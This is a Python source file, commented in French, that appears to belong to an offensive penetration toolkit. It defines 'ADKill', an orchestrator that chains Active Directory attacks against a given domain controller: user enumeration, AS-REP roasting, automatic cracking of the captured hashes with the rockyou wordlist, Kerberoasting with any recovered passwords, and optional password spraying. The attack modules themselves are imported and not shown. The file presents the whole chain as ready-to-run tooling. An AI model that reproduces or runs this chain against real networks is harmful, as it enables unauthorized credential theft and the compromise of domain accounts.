from .loot import LootStore
from .enum import Enumerator
from .roasting import Roaster
from .crack import Cracker
from .spray import Sprayer


class ADKill:
    """Orchestrateur de la chaîne AD automatisée.
    Câble les modules via le système d'observers du LootStore :
    un hash récupéré -> crack auto -> nouveau cred -> kerberoast auto."""

    def __init__(self, domain, dc_ip, wordlist="/usr/share/wordlists/rockyou.txt"):
        self.loot = LootStore(domain, dc_ip)
        self.enum = Enumerator(self.loot)
        self.roaster = Roaster(self.loot)
        self.cracker = Cracker(wordlist=wordlist)
        self.sprayer = Sprayer(self.loot)

        # Câblage réactif
        self.loot.on(self._on_event)

    def _on_event(self, event_type, data):
        """Réagit aux nouvelles données du loot."""
        if event_type == "hash":
            user, h, htype = data
            pwd = self.cracker.crack(user, h, htype)
            if pwd:
                self.loot.add_cred(user, pwd, "password")

        elif event_type == "cred":
            user, secret, stype = data
            # Nouveau cred -> on tente le kerberoast authentifié
            if stype == "password":
                self.roaster.kerberoast(user, secret)

    # ---------- Pipeline ----------
    def run(self, userlist=None):
        print("=" * 50)
        print(f"[*] ADKill lancé sur {self.loot.domain} ({self.loot.dc_ip})")
        print("=" * 50)

        # 1. Énumération
        if userlist:
            self.enum.enum_users(userlist)

        # 2. AS-REP roasting (déclenche crack auto via observer)
        self.roaster.asrep_roast()

        # 3. Résumé
        print("\n" + "=" * 50)
        print("[*] RÉSUMÉ FINAL")
        s = self.loot.summary()
        print(f"    Users  : {s['users']}")
        print(f"    Creds  : {s['creds']}")
        print(f"    Hashes : {s['hashes']}")
        print(f"    SPNs   : {s['spns']}")
        print("=" * 50)

        self.loot.dump()
        return self.loot


def run_adkill(args):
    """Point d'entrée pour l'orchestrateur arsenal.py."""
    adk = ADKill(
        domain=args.domain,
        dc_ip=args.dc_ip,
        wordlist=args.wordlist,
    )

    loot = adk.run(userlist=args.userlist)

    # Spray manuel optionnel (non câblé dans run() volontairement)
    if args.spray:
        adk.sprayer.spray_password(args.spray)
        # On redéclenche un résumé après le spray
        print("\n[*] Résumé post-spray :")
        s = loot.summary()
        print(f"    Creds  : {s['creds']}")
